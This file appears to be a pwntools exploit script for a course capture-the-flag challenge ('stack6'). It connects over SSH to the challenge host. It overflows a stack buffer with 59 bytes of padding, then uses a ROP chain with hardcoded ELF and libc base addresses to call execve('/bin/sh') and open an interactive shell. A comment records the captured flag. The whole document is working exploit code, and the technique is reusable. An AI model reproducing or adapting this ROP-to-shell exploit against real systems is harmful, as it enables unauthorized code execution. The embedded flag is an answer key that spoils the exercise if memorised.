import struct
import sys

from pwn import *

s = ssh(host='cs4401shell.walls.ninja',user='malbayrak')
p = s.process('/problems/stack6r-32_3_92d93bf90cc30b2ad4bac101a06dd84c/stack6')

context.binary = elf = p.elf
libc = elf.libc

offset = 59

elf.address = 0x56555000
libc.address = 0xf7dec000

rop = ROP([elf,libc])

binsh = next(libc.search(b'/bin/sh\x00'))
execve = next(libc.search(b'execve'))

rop.raw(0x56555426)
rop.execve(binsh,0,0)


print(rop.dump())
expl = offset*b'A' + bytes(rop)

#sys.stderr.buffer.write(expl)
#p = process('./stack6')
p.sendline(expl)
p.interactive()
#flag is wpi{ddfbcb93af6b975f3e2d9e890eeb2463}

# works locally, as well as remote, but something weird going on with ssh
